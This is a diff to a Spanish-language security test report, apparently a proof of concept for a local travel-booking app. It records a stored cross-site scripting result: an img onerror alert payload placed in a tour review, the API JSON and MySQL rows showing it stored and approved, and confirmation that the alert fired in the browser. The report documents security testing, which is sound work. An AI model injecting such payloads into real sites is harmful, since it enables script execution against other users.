@@ -78,8 +78,18 @@ Connection: close
 ---
 
 ## 6. Resultado Real (Completar tras la prueba)
-*(Espacio reservado para el evaluador)*
+Evidencia real registrada en API y base de datos (`DBTravelink`) tras la inyección en `idReserva = 500`:
 
-```text
-
+### Lectura en API (`curl.exe -s "http://127.0.0.1:8080/api/calificar?idTour=100&idAgencia=10"`)
+```json
+{"status":"success","idAgencia":10,"idTour":100,"promedio":5.0,"total":1,"calificaciones":[{"id":1,"turista":"Turista Alfa","tour":"Tour SintÃ©tico Machu Picchu MÃ¡gico","estrellas":5,"comentario":"Excelente viaje <img src=x onerror=\"alert('XSS-TRAVELINK-POC')\"> recomendado","fecha":"11/11/2026"}]}
 ```
+
+### Verificación directa en MySQL (`SELECT idCalificacion, idUsuario, idAgencia, idReserva, estrellas, comentario, estadoRevision, eliminadoPorAdmin FROM Calificacion;`)
+```text
+idCalificacion	idUsuario	idAgencia	idReserva	estrellas	comentario	estadoRevision	eliminadoPorAdmin
+1	100	10	500	5	Excelente viaje <img src=x onerror="alert('XSS-TRAVELINK-POC')"> recomendado	Aprobada	0
+```
+
+### Ejecución en navegador
+- El popup modal `alert('XSS-TRAVELINK-POC')` en el navegador sobre `http://127.0.0.1:8080/html/turista/detalle.html?id=100` ya fue ejecutado y capturado por el usuario (imagen revisada).
